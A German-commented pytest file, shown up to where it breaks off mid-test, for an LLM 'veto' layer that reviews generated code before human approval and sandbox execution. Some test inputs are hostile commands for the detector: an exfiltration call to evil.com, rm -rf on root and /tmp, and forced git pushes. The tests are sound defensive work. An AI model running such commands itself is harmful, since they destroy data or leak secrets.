"""Patch 209 (Phase 5a #7) — Tests fuer die Veto-Logik / Sancho Panza
vor der Sandbox-Code-Execution.

Schichten:

1. **Pure-Function-Schicht** — ``should_run_veto``, ``_has_risky_token``,
   ``_is_trivial_oneliner``, ``build_veto_messages``, ``parse_veto_verdict``.
2. **Async-Wrapper** — ``run_veto`` mit Mock-LLM, fail-open auf Crash/
   leerer/non-tuple Response.
3. **Audit-Trail** — ``store_veto_audit`` schreibt in ``code_vetoes``,
   truncated bei langen Texten, silent skip ohne DB.
4. **Source-Audit legacy.py** — Logging-Tag, Imports, Veto-Reihenfolge
   (vor HitL), Audit-Aufruf, Wandschlag-Payload-Schema, Feature-Flag.
5. **Source-Audit nala.py** — JS-Funktion ``renderVetoCard``, CSS-Klassen
   ``.veto-card``/``.veto-reason``, escapeHtml-Usage, 44px-Touch im
   Toggle, kein Approve-Button, Early-Return in renderCodeExecution.
6. **End-to-End** — chat_completions mit Mock-LLM und Veto-Pfad
   (pass/veto/skipped/disabled) — beweist dass HitL/Sandbox bei VETO
   nicht laufen und das Wandschlag-Payload korrekt in der Response
   landet.
7. **JS-Integrity** — ``node --check`` ueber alle inline <script>-Bloecke
   (analog P206/P207/P208, skipped wenn node fehlt).
8. **Smoke** — Config-Flags, ``code_vetoes``-Tabelle, Module-Exports.
"""
from __future__ import annotations

import asyncio
import inspect
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock

import pytest


ROOT = Path(__file__).resolve().parents[2]


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def tmp_db(monkeypatch):
    from sqlalchemy.ext.asyncio import (
        AsyncSession,
        async_sessionmaker,
        create_async_engine,
    )

    tmpdir = tempfile.mkdtemp()
    db_file = Path(tmpdir) / "test_p209.db"
    url = f"sqlite+aiosqlite:///{db_file}"

    import zerberus.core.database as db_mod
    from zerberus.core.database import Base

    engine = create_async_engine(url, echo=False)
    sm = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async def setup():
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

    asyncio.run(setup())

    monkeypatch.setattr(db_mod, "_engine", engine)
    monkeypatch.setattr(db_mod, "_async_session_maker", sm)
    yield sm
    asyncio.run(engine.dispose())


@pytest.fixture
def env(tmp_path, monkeypatch, tmp_db):
    """Settings-Cache + chdir + Persona-Files."""
    from zerberus.core.config import get_settings

    get_settings()
    monkeypatch.chdir(tmp_path)
    Path("system_prompt_alice.json").write_text(
        '{"prompt": "Du bist Alice."}', encoding="utf-8",
    )
    Path("system_prompt.json").write_text(
        '{"prompt": "Default."}', encoding="utf-8",
    )
    return tmp_path


def _build_request(project_id=None, session_id="s-test", profile_name="alice"):
    state = SimpleNamespace(
        profile_name=profile_name,
        permission_level="admin",
        allowed_model=None,
        temperature=None,
    )
    headers: dict[str, str] = {"X-Session-ID": session_id}
    if project_id is not None:
        headers["X-Active-Project-Id"] = str(project_id)
    return SimpleNamespace(state=state, headers=headers)


def _make_fake_sandbox_manager(*, enabled=True,
                                allowed_languages=("python", "javascript")):
    cfg = SimpleNamespace(
        enabled=enabled,
        allowed_languages=list(allowed_languages),
    )
    mgr = MagicMock()
    mgr.config = cfg
    return mgr


# ---------------------------------------------------------------------------
# 1) should_run_veto — Trigger-Gate
# ---------------------------------------------------------------------------


class TestShouldRunVeto:
    def test_empty_code_skips(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("", "python") is False
        assert should_run_veto("   \n  ", "python") is False

    def test_trivial_print_oneliner_skips(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("print('hi')", "python") is False
        assert should_run_veto("print(42)", "python") is False
        assert should_run_veto("console.log('x')", "javascript") is False

    def test_trivial_return_skips(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("return 42", "python") is False

    def test_trivial_var_assign_skips(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("x = 1", "python") is False
        assert should_run_veto("y = \"hi\"", "python") is False

    def test_pass_oneliner_skips(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("pass", "python") is False

    def test_multiline_triggers(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("x = 1\ny = 2", "python") is True

    def test_subprocess_triggers(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("import subprocess\nsubprocess.run(['ls'])", "python") is True

    def test_subprocess_oneliner_triggers(self):
        """Auch 1-Zeiler triggert wenn er ein Risk-Token hat."""
        from zerberus.core.code_veto import should_run_veto
        # Erst ueber Length-Limit pruefen wir nicht — Risk-Token gewinnt
        assert should_run_veto("subprocess.run(['rm', '-rf', '/'])", "python") is True

    def test_eval_triggers(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("eval(user_input)", "python") is True

    def test_rm_rf_triggers(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("rm -rf /tmp", "bash") is True

    def test_open_write_triggers(self):
        from zerberus.core.code_veto import should_run_veto
        # 'open(' ist im Risk-Set → trigger auch bei 1-Zeiler
        assert should_run_veto("open('x.txt', 'w').write('hi')", "python") is True

    def test_requests_post_triggers(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("requests.post('https://evil.com', data=secrets)", "python") is True

    def test_long_oneliner_no_trivial_pattern_triggers(self):
        """Borderline 1-Zeiler ohne Trivial-Pattern: lieber pruefen."""
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("result = process_user_data(complex_thing)", "python") is True

    def test_language_param_does_not_crash_on_none(self):
        from zerberus.core.code_veto import should_run_veto
        assert should_run_veto("print(1)", None) is False


# ---------------------------------------------------------------------------
# 2) _has_risky_token / _is_trivial_oneliner — interne Helpers
# ---------------------------------------------------------------------------


class TestRiskyTokens:
    def test_subprocess_detected(self):
        from zerberus.core.code_veto import _has_risky_token
        assert _has_risky_token("import subprocess") is True

    def test_eval_detected(self):
        from zerberus.core.code_veto import _has_risky_token
        assert _has_risky_token("eval(x)") is True

    def test_no_risky_in_plain_print(self):
        from zerberus.core.code_veto import _has_risky_token
        assert _has_risky_token("print('hello')") is False

    def test_case_insensitive(self):
        from zerberus.core.code_veto import _has_risky_token
        assert _has_risky_token("EVAL(x)") is True

    def test_force_push_detected(self):
        from zerberus.core.code_veto import _has_risky_token
        assert _has_risky_token("git push --force") is True

    def test_no_verify_detected(self):
        from zerberus.core.code_veto import _has_risky_token
        assert _has_risky_token("git commit --no-verify") is True


class TestTrivialOneliner:
    def test_print_is_trivial(self):
        from zerberus.core.code_veto import _is_trivial_oneliner
        assert _is_trivial_oneliner("print('hi')") is True

    def test_multiline_not_trivial(self):
        from zerberus.core.code_veto import _is_trivial_oneliner
        assert _is_trivial_oneliner("print('hi')\nprint('there')") is False

    def test_long_line_not_trivial(self):
        from zerberus.core.code_veto import _is_trivial_oneliner
        long = "print(" + "x" * 200 + ")"
        assert _is_trivial_oneliner(long) is False

    def test_pass_is_trivial(self):
        from zerberus.core.code_veto import _is_trivial_oneliner
        assert _is_trivial_oneliner("pass") is True

    def test_return_is_trivial(self):
        from zerberus.core.code_veto import _is_trivial_oneliner
        assert _is_trivial_oneliner("return 42") is True


# ---------------------------------------------------------------------------
# 3) build_veto_messages — Pure-Function Prompt-Builder
# ---------------------------------------------------------------------------


class TestBuildVetoMessages:
    def test_returns_two_messages(self):
        from zerberus.core.code_veto import build_veto_messages
        msgs = build_veto_messages("print(1)", "python", "Sag hallo.")
        assert isinstance(msgs, list)
        assert len(msgs) == 2
        assert msgs[0]["role"] == "system"
        assert msgs[1]["role"] == "user"

    def test_system_prompt_demands_pass_or_veto(self):
        from zerberus.core.code_veto import build_veto_messages, VETO_SYSTEM_PROMPT
        msgs = build_veto_messages("x", "python", "y")
        assert "PASS" in msgs[0]["content"]
        assert "VETO" in msgs[0]["content"]
        assert msgs[0]["content"] == VETO_SYSTEM_PROMPT

    def test_user_message_contains_code_and_lang(self):
        from zerberus.core.code_veto import build_veto_messages
        msgs = build_veto_messages("print(42)", "python", "Was tut das?")
        u = msgs[1]["content"]
        assert "Was tut das?" in u
        assert "python" in u
        assert "print(42)" in u

    def test_lang_normalized_lowercase(self):
        from zerberus.core.code_veto import build_veto_messages
        msgs = build_veto_messages("x", "PYTHON", "y")
        assert "python" in msgs[1]["content"]

    def test_empty_lang_falls_back_to_unknown(self):
        from zerberus.core.code_veto import build_veto_messages
        msgs = build_veto_messages("x", "", "y")
        assert "unknown" in msgs[1]["content"]

    def test_long_code_truncated_in_prompt(self):
        from zerberus.core.code_veto import build_veto_messages, VETO_CODE_MAX_BYTES
        big = "x = 1\n" * (VETO_CODE_MAX_BYTES // 6 + 100)
        msgs = build_veto_messages(big, "python", "y")
        u = msgs[1]["content"]
        assert "[gekuerzt]" in u

    def test_no_persona_leak(self):
        """System-Prompt darf KEIN Persona/Tone-Hint enthalten — der
        Veto-Probe ist Werkzeug, kein Gespraech."""
        from zerberus.core.code_veto import VETO_SYSTEM_PROMPT
        # Kein "Du heisst Nala", kein Wort wie "Persona" oder "Profil"
        forbidden = ["Nala", "Persona", "Stil", "Tone", "Tonfall", "freundlich", "bitte sei"]
        for f in forbidden:
            assert f.lower() not in VETO_SYSTEM_PROMPT.lower(), f"forbidden: {f}"


# ---------------------------------------------------------------------------
# 4) parse_veto_verdict — Verdict-Parser
# ---------------------------------------------------------------------------


class TestParseVetoVerdict:
    def test_pass_clean(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("PASS")
        assert v.veto is False
        assert v.reason == ""

    def test_veto_clean(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("VETO: Loescht zu viel.")
        assert v.veto is True
        assert "Loescht" in v.reason

    def test_veto_with_dash(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("VETO - Sicherheitsproblem")
        assert v.veto is True
        assert "Sicherheitsproblem" in v.reason

    def test_lowercase_pass(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("pass")
        assert v.veto is False

    def test_lowercase_veto(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("veto: gefaehrlich")
        assert v.veto is True

    def test_markdown_bold(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("**VETO**: zu viel Schaden")
        assert v.veto is True
        assert "Schaden" in v.reason

    def test_quoted_pass(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict('"PASS"')
        assert v.veto is False

    def test_pass_with_reason_ignored(self):
        """Bei PASS interessiert die Begruendung nicht — sie soll leer sein."""
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("PASS: alles gut")
        assert v.veto is False
        assert v.reason == ""

    def test_unparseable_falls_open_to_pass(self):
        """Unklares Output → fail-open zu PASS (kein Veto bei
        unverstaendlicher Probe-Antwort)."""
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("Hmm, ich weiss nicht so recht...")
        assert v.veto is False
        assert v.error == "parse_failed"

    def test_empty_input(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("")
        assert v.veto is False

    def test_multiline_reason(self):
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("VETO: Erste Zeile\nZweite Zeile.\n\nAbsatz drei.")
        assert v.veto is True
        # Erste + zweite Zeile gehoeren zur Begruendung, dritter Absatz nicht
        assert "Erste Zeile" in v.reason
        assert "Zweite Zeile" in v.reason
        assert "Absatz drei" not in v.reason

    def test_verdict_in_first_64_chars_fallback(self):
        """Falls die erste Zeile nicht klar matchet, suchen wir VETO/PASS
        in den ersten 64 Zeichen."""
        from zerberus.core.code_veto import parse_veto_verdict
        v = parse_veto_verdict("Mein Verdict: VETO weil sehr gefaehrlich.")
        assert v.veto is True

    def test_long_reason_truncated(self):
        from zerberus.core.code_veto import parse_veto_verdict, VETO_REASON_MAX_BYTES
        long = "VETO: " + ("x" * (VETO_REASON_MAX_BYTES + 200))
        v = parse_veto_verdict(long)
        assert v.veto is True
        assert len(v.reason.encode("utf-8")) <= VETO_REASON_MAX_BYTES


# ---------------------------------------------------------------------------
# 5) VetoVerdict — Dataclass
# ---------------------------------------------------------------------------


class TestVetoVerdict:
    def test_payload_dict_passes(self):
        from zerberus.core.code_veto import VetoVerdict
        v = VetoVerdict(veto=False)
        d = v.to_payload_dict()
        assert d["vetoed"] is False
        assert d["reason"] == ""
        assert "latency_ms" in d

    def test_payload_dict_vetoes(self):
        from zerberus.core.code_veto import VetoVerdict
        v = VetoVerdict(veto=True, reason="zu schlimm", latency_ms=234)
        d = v.to_payload_dict()
        assert d["vetoed"] is True
        assert d["reason"] == "zu schlimm"
        assert d["latency_ms"] == 234


# ---------------------------------------------------------------------------
# 6) run_veto — Async-Wrapper
# ---------------------------------------------------------------------------


class TestRunVeto:
    def test_happy_pass(self):
        from zerberus.core.code_veto import run_veto

        async def fake_call(messages, session_id, **kw):
            return ("PASS", "veto-model", 1, 1, 0.0)
        llm = SimpleNamespace(call=fake_call)
        v = asyncio.run(run_veto("print(1)", "python", "Sag hi", llm, "s1"))
        assert v.veto is False
        assert v.error is None
        assert v.latency_ms is not None and v.latency_ms >= 0

    def test_happy_veto_with_reason(self):
        from zerberus.core.code_veto import run_veto

        async def fake_call(messages, session_id, **kw):
            return ("VETO: rm -rf /tmp loescht zu viel", "veto-model", 1, 1, 0.0)
        llm = SimpleNamespace(call=fake_call)
        v = asyncio.run(run_veto("rm -rf /tmp", "bash", "loesche tmp", llm, "s1"))
        assert v.veto is True
        assert "loescht zu viel" in v.reason

    def test_temperature_passed_through(self):
        from zerberus.core.code_veto import run_veto

        captured = {}

        async def fake_call(messages, session_id, **kw):
            captured["temp"] = kw.get("temperature_override")
            return ("PASS", "m", 1, 1, 0.0)

        llm = SimpleNamespace(call=fake_call)
        asyncio.run(run_veto("x = 1\ny = 2", "python", "p", llm, "s1", temperature=0.05))
        assert captured["temp"] == 0.05

    def test_default_temperature_is_low(self):
        from zerberus.core.code_veto import (
            run_veto, DEFAULT_VETO_TEMPERATURE,
        )
        assert DEFAULT_VETO_TEMPERATURE <= 0.2

        captured = {}

        async def fake_call(messages, session_id, **kw):
            captured["temp"] = kw.get("temperature_override")
            return ("PASS", "m", 1, 1, 0.0)

        llm = SimpleNamespace(call=fake_call)
        asyncio.run(run_veto("a\nb", "python", "p", llm, "s1"))
        assert captured["temp"] == DEFAULT_VETO_TEMPERATURE

    def test_llm_crash_fails_open(self):
        from zerberus.core.code_veto import run_veto

        async def fake_call(messages, session_id, **kw):
            raise RuntimeError("LLM is down")
        llm = SimpleNamespace(call=fake_call)
        v = asyncio.run(run_veto("a\nb", "python", "p", llm, "s1"))
        assert v.veto is False
        assert v.error and "LLM is down" in v.error

    def test_empty_response_fails_open(self):
        from zerberus.core.code_veto import run_veto

        async def fake_call(messages, session_id, **kw):
            return ("", "m", 1, 1, 0.0)
        llm = SimpleNamespace(call=fake_call)
        v = asyncio.run(run_veto("a\nb", "python", "p", llm, "s1"))
        assert v.veto is False
        assert v.error == "empty_response"

    def test_non_tuple_response_fails_open(self):
        from zerberus.core.code_veto import run_veto

        async def fake_call(messages, session_id, **kw):
            return None  # bad
        llm = SimpleNamespace(call=fake_call)
        v = asyncio.run(run_veto("a\nb", "python", "p", llm, "s1"))
        assert v.veto is False
        assert v.error == "unexpected_type"

    def test_non_string_response_fails_open(self):
        from zerberus.core.code_veto import run_veto

        async def fake_call(messages, session_id, **kw):
            return (12345, "m", 1, 1, 0.0)
        llm = SimpleNamespace(call=fake_call)
        v = asyncio.run(run_veto("a\nb", "python", "p", llm, "s1"))
        assert v.veto is False
        assert v.error == "empty_response"


# ---------------------------------------------------------------------------
# 7) store_veto_audit
# ---------------------------------------------------------------------------


class TestStoreVetoAudit:
    def test_writes_audit_row(self, tmp_db):
        from zerberus.core.code_veto import store_veto_audit
        from zerberus.core.database import CodeVeto
        from sqlalchemy import select

        asyncio.run(store_veto_audit(
            audit_id="abc123",
            session_id="s-x",
            project_id=42,
            project_slug="demo",
            language="python",
            code_text="print(1)",
            user_prompt="sag hi",
            verdict="pass",
            reason=None,
            latency_ms=120,
        ))

        async def read():
            async with tmp_db() as session:
                rows = (await session.execute(select(CodeVeto))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 1
        assert rows[0].audit_id == "abc123"
        assert rows[0].verdict == "pass"
        assert rows[0].project_id == 42
        assert rows[0].latency_ms == 120

    def test_truncate_long_text(self, tmp_db):
        from zerberus.core.code_veto import store_veto_audit, AUDIT_MAX_TEXT_BYTES
        from zerberus.core.database import CodeVeto
        from sqlalchemy import select

        long_code = "x = 1\n" * (AUDIT_MAX_TEXT_BYTES // 6 + 200)
        asyncio.run(store_veto_audit(
            audit_id="t1",
            session_id="s-trunc",
            project_id=1,
            project_slug="x",
            language="python",
            code_text=long_code,
            user_prompt="p",
            verdict="veto",
            reason="lang",
            latency_ms=10,
        ))

        async def read():
            async with tmp_db() as session:
                rows = (await session.execute(select(CodeVeto))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 1
        assert "[gekuerzt]" in rows[0].code_text

    def test_silent_skip_without_db(self, monkeypatch):
        """Audit ohne DB-Init darf keine Exception werfen."""
        import zerberus.core.database as db_mod
        from zerberus.core.code_veto import store_veto_audit

        monkeypatch.setattr(db_mod, "_async_session_maker", None)
        # Darf nicht crashen
        asyncio.run(store_veto_audit(
            audit_id="x", session_id="s", project_id=None, project_slug=None,
            language="python", code_text="x", user_prompt="y",
            verdict="skipped", reason=None, latency_ms=None,
        ))


# ---------------------------------------------------------------------------
# 8) Source-Audit legacy.py — Verdrahtung
# ---------------------------------------------------------------------------


class TestLegacySourceAudit:
    @pytest.fixture
    def src(self):
        return (ROOT / "zerberus" / "app" / "routers" / "legacy.py").read_text(
            encoding="utf-8",
        )

    def test_veto_logging_tag_present(self, src):
        assert "[VETO-209]" in src

    def test_imports_code_veto_module(self, src):
        assert "from zerberus.core.code_veto import" in src
        assert "run_veto" in src
        assert "should_run_veto" in src

    def test_audit_call_present(self, src):
        assert "store_veto_audit" in src

    def test_feature_flag_check(self, src):
        assert "code_veto_enabled" in src

    def test_temperature_param_used(self, src):
        assert "code_veto_temperature" in src

    def test_veto_runs_before_hitl(self, src):
        """Veto-Block muss VOR HitL-Pending-Erzeugung kommen — sonst
        laeuft HitL parallel zum Veto, was den Sinn der Layered Defense
        zerstoert."""
        idx_veto = src.find("[VETO-209]")
        # HitL-spezifisches create_pending: code=_block.code-Pattern (P206)
        idx_hitl_create = src.find("code=_block.code")
        assert idx_veto != -1
        assert idx_hitl_create != -1
        assert idx_veto < idx_hitl_create, \
            f"VETO-209 muss VOR HitL create_pending kommen ({idx_veto} < {idx_hitl_create})"

    def test_skip_hitl_and_sandbox_var(self, src):
        """Bei Veto wird der HitL+Sandbox-Pfad uebersprungen."""
        assert "_veto_skip_hitl_and_sandbox" in src

    def test_payload_contains_veto_field(self, src):
        """Wandschlag-Payload enthaelt das Veto-Sub-Field."""
        assert '"veto":' in src
        # to_payload_dict-Aufruf
        assert ".to_payload_dict()" in src

    def test_payload_skipped_true_on_veto(self, src):
        """Veto setzt skipped=True und hitl_status='vetoed' — damit die
        Frontend-Logik das wie einen Skip-Pfad behandelt UND die
        code_executions-Tabelle keinen Audit bekommt."""
        # Suche nach dem Veto-Payload-Block
        m = re.search(
            r"_veto_payload\s*=\s*\{[^}]*\"hitl_status\":\s*\"vetoed\"",
            src, re.DOTALL,
        )
        assert m is not None, "Wandschlag-Payload muss hitl_status='vetoed' setzen"

    def test_audit_uses_six_fields(self, src):
        """store_veto_audit-Aufruf enthaelt audit_id, session_id, project_id,
        verdict, reason, latency_ms — alle Korrelations-Felder."""
        # Suche nach dem audit_id-Pattern
        assert "audit_id=" in src
        assert "verdict=" in src
        assert "reason=" in src

    def test_fail_open_around_veto_pipeline(self, src):
        """try/except um den ganzen Veto-Pfad."""
        assert "[VETO-209] Pipeline-Fehler (fail-open):" in src


# ---------------------------------------------------------------------------
# 9) Source-Audit nala.py — Frontend-Verdrahtung
# ---------------------------------------------------------------------------


class TestNalaSourceAudit:
    @pytest.fixture
    def src(self):
        return (ROOT / "zerberus" / "app" / "routers" / "nala.py").read_text(
            encoding="utf-8",
        )

    def test_render_veto_card_function_exists(self, src):
        assert "function renderVetoCard(" in src

    def test_render_code_execution_calls_render_veto_card(self, src):
        assert "renderVetoCard(" in src

    def test_render_code_execution_early_returns_on_veto(self, src):
        """Bei vetoed=true returnt renderCodeExecution frueh — keine
        normale Code-Card daneben."""
        # Suche das "vetoed === true" Pattern und einen return danach
        m = re.search(
            r"vetoInfo\.vetoed\s*===\s*true.*?return;",
            src, re.DOTALL,
        )
        assert m is not None
        assert m.end() - m.start() < 800, "early return muss schnell nach dem Check kommen"

    def test_veto_card_css_classes(self, src):
        assert ".veto-card {" in src
        assert ".veto-card-header" in src
        assert ".veto-reason" in src

    def test_veto_card_rote_border(self, src):
        """Veto-Card soll rote Border haben (visuell klar als Block)."""
        # Sucht nach veto-card mit rgba Rot-Werten (229,115,115 ist die
        # rote Akzentfarbe der UI)
        m = re.search(
            r"\.veto-card\s*\{[^}]*229\s*,\s*115\s*,\s*115",
            src, re.DOTALL,
        )
        assert m is not None, "veto-card muss rote Border haben"

    def test_veto_card_44px_touch_on_toggle(self, src):
        """Code-Toggle-Button ist 44px Touch-Target."""
        m = re.search(
            r"\.veto-code-toggle\s*\{[^}]*min-height:\s*44px",
            src, re.DOTALL,
        )
        assert m is not None, "veto-code-toggle muss min-height 44px haben"

    def test_veto_card_no_approve_button(self, src):
        """Wandschlag-Banner darf keinen Approve-Button rendern — read-only."""
        # Im renderVetoCard-Block darf kein "approve"/"hitl-approve"-String stehen
        m = re.search(
            r"function renderVetoCard\([^)]*\)\s*\{(.*?)\n\s*\}\s*\n",
            src, re.DOTALL,
        )
        assert m is not None
        body = m.group(1)
        assert "approve" not in body.lower()
        assert "hitl-resolve" not in body.lower()

    def test_render_veto_card_uses_text_or_escape(self, src):
        """User-/LLM-Strings muessen via textContent oder escapeHtml in
        die Card — kein nackter innerHTML-Insert von User-Strings."""
        m = re.search(
            r"function renderVetoCard\([^)]*\)\s*\{(.*?)\n\s*\}\s*\n",
            src, re.DOTALL,
        )
        assert m is not None
        body = m.group(1)
        # Reason wird via textContent gesetzt — XSS-safe by default
        assert "textContent" in body
        # Code-Block geht durch escapeHtml
        assert "escapeHtml(" in body

    def test_post_klick_states_or_collapsed(self, src):
        """Code-Toggle nutzt veto-collapsed-State."""
        assert "veto-collapsed" in src


# ---------------------------------------------------------------------------
# 10) JS-Integrity — node --check ueber alle inline scripts
# ---------------------------------------------------------------------------


class TestJsSyntaxIntegrity:
    def test_nala_html_passes_node_check(self):
        if not shutil.which("node"):
            pytest.skip("node nicht im PATH")
        src = (ROOT / "zerberus" / "app" / "routers" / "nala.py").read_text(
            encoding="utf-8",
        )
        scripts = re.findall(r"<script>(.*?)</script>", src, re.DOTALL)
        assert len(scripts) >= 1
        for i, body in enumerate(scripts):
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=f"_p209_{i}.js", delete=False, encoding="utf-8",
            ) as tf:
                tf.write(body)
                p = tf.name
            try:
                r = subprocess.run(["node", "--check", p],
                                   capture_output=True, text=True)
                assert r.returncode == 0, f"block {i} fails: {r.stderr[:400]}"
            finally:
                Path(p).unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# 11) End-to-End — chat_completions mit Veto-Pfad
# ---------------------------------------------------------------------------


def _make_two_step_llm(*, code_block_answer, veto_text):
    """Erste Antwort: LLM produziert Code-Block. Zweite Antwort: Veto-Probe."""
    state = {"n": 0}

    async def fake_call(self, messages, session_id,
                        model_override=None, temperature_override=None):
        state["n"] += 1
        if state["n"] == 1:
            return (code_block_answer, "main-model", 1, 1, 0.0)
        # Zweiter Call ist die Veto-Probe (temperature_override sollte 0.1 sein)
        return (veto_text, "veto-model", 1, 1, 0.0)

    return fake_call, state


def _make_three_step_llm(*, code_block_answer, veto_text, synthesis_answer):
    """Drei Antworten: Haupt-LLM, Veto-Probe, Synthese."""
    state = {"n": 0}

    async def fake_call(self, messages, session_id,
                        model_override=None, temperature_override=None):
        state["n"] += 1
        if state["n"] == 1:
            return (code_block_answer, "main-model", 1, 1, 0.0)
        elif state["n"] == 2:
            return (veto_text, "veto-model", 1, 1, 0.0)
        return (synthesis_answer, "synth-model", 1, 1, 0.0)

    return fake_call, state


class TestE2EVeto:
    """Ende-zu-Ende: chat_completions mit Veto-Pfad. Hier mocken wir LLM,
    Sandbox-Manager und execute_in_workspace."""

    def _setup_endpoint(self, monkeypatch, *, llm, hitl_decision="approved",
                        sandbox_called=None, code_veto_enabled=True,
                        spec_check_enabled=False, hitl_enabled=True):
        from zerberus.app.routers import legacy as legacy_mod
        from zerberus.core.llm import LLMService
        from zerberus.core.config import get_settings

        monkeypatch.setattr(LLMService, "call", llm)
        monkeypatch.setattr(legacy_mod, "_ORCH_PIPELINE_OK", False)

        settings = get_settings()
        monkeypatch.setattr(settings.projects, "code_veto_enabled", code_veto_enabled)
        monkeypatch.setattr(settings.projects, "spec_check_enabled", spec_check_enabled)
        monkeypatch.setattr(settings.projects, "hitl_enabled", hitl_enabled)
        monkeypatch.setattr(settings.projects, "hitl_timeout_seconds", 1)
        monkeypatch.setattr(settings.projects, "sandbox_writable", False)

        fake_mgr = _make_fake_sandbox_manager(enabled=True)
        monkeypatch.setattr(
            "zerberus.modules.sandbox.manager.get_sandbox_manager",
            lambda: fake_mgr,
        )

        captured = {"executed": False, "sandbox_calls": 0}
        if sandbox_called is not None:
            captured["sandbox_calls"] = sandbox_called

        async def fake_execute(*, project_id, code, language, base_dir,
                               writable=False, timeout=None):
            captured["executed"] = True
            captured["sandbox_calls"] += 1
            from zerberus.modules.sandbox.manager import SandboxResult
            return SandboxResult(
                stdout="ran\n", stderr="", exit_code=0,
                execution_time_ms=10, truncated=False, error=None,
            )

        monkeypatch.setattr(
            "zerberus.core.projects_workspace.execute_in_workspace",
            fake_execute,
        )

        from zerberus.core.hitl_chat import ChatHitlGate

        async def fake_wait(self, pending_id, timeout):
            p = self._pendings.get(pending_id)
            if p is not None:
                p.status = hitl_decision
            return hitl_decision

        monkeypatch.setattr(ChatHitlGate, "wait_for_decision", fake_wait)
        return captured

    def _create_project(self, **kwargs):
        from zerberus.core.projects_repo import create_project
        return asyncio.run(create_project(**kwargs))

    def _call(self, project_id, *, user_msg="hilf mir mal", session_id="s-veto"):
        from zerberus.app.routers import legacy as legacy_mod
        from zerberus.core.config import get_settings
        req = legacy_mod.ChatCompletionRequest(
            messages=[legacy_mod.Message(role="user", content=user_msg)]
        )
        request = _build_request(project_id, session_id=session_id)
        return asyncio.run(legacy_mod.chat_completions(
            request, req, get_settings(),
        ))

    def test_veto_blocks_sandbox(self, env, monkeypatch):
        """Wenn das Veto-Modell VETO antwortet, laeuft KEIN
        execute_in_workspace und das ``code_execution.veto.vetoed`` Feld
        ist True in der Response."""
        from zerberus.core.database import CodeVeto
        from sqlalchemy import select

        llm, calls = _make_two_step_llm(
            code_block_answer="```python\nimport subprocess\nsubprocess.run(['rm','-rf','/tmp'])\n```",
            veto_text="VETO: rm -rf /tmp loescht zu viel. Praeziser machen.",
        )
        captured = self._setup_endpoint(monkeypatch, llm=llm)
        proj = self._create_project(name="P-Veto-Block")
        resp = self._call(proj["id"])

        # Sandbox lief NICHT
        assert captured["executed"] is False
        assert captured["sandbox_calls"] == 0
        # code_execution-Feld zeigt Veto
        ce = resp.code_execution
        assert ce is not None
        assert ce.get("skipped") is True
        assert ce.get("hitl_status") == "vetoed"
        assert ce.get("veto", {}).get("vetoed") is True
        assert "loescht zu viel" in ce.get("veto", {}).get("reason", "")
        # Audit-Trail in code_vetoes
        async def read():
            from zerberus.core.database import _async_session_maker
            async with _async_session_maker() as session:
                rows = (await session.execute(select(CodeVeto))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 1
        assert rows[0].verdict == "veto"

    def test_pass_continues_to_sandbox(self, env, monkeypatch):
        """PASS vom Veto-Modell → HitL+Sandbox laufen normal weiter."""
        from zerberus.core.database import CodeVeto
        from sqlalchemy import select

        llm, calls = _make_three_step_llm(
            code_block_answer="```python\nx = 1\ny = 2\nprint(x+y)\n```",
            veto_text="PASS",
            synthesis_answer="Das Ergebnis ist 3.",
        )
        captured = self._setup_endpoint(monkeypatch, llm=llm)
        proj = self._create_project(name="P-Veto-Pass")
        resp = self._call(proj["id"])

        # Sandbox lief
        assert captured["executed"] is True
        ce = resp.code_execution
        assert ce is not None
        assert ce.get("skipped") is False
        assert ce.get("hitl_status") == "approved"
        # code_execution.veto-Feld nicht gesetzt (oder vetoed=False) — weil Pass
        # bei pass kein veto-payload gesetzt
        assert ce.get("veto") is None or ce.get("veto", {}).get("vetoed") is False
        # Audit: Pass-Zeile
        async def read():
            from zerberus.core.database import _async_session_maker
            async with _async_session_maker() as session:
                rows = (await session.execute(select(CodeVeto))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 1
        assert rows[0].verdict == "pass"

    def test_trivial_code_skips_veto(self, env, monkeypatch):
        """Triviales print(1) wird NICHT durch den Veto-LLM gejagt
        (Token-Spar)."""
        from zerberus.core.database import CodeVeto
        from sqlalchemy import select

        # Nur ZWEI Calls: Haupt-LLM (mit print(1)) + Synthese — KEIN Veto
        state = {"n": 0}

        async def fake_call(self, messages, session_id,
                            model_override=None, temperature_override=None):
            state["n"] += 1
            if state["n"] == 1:
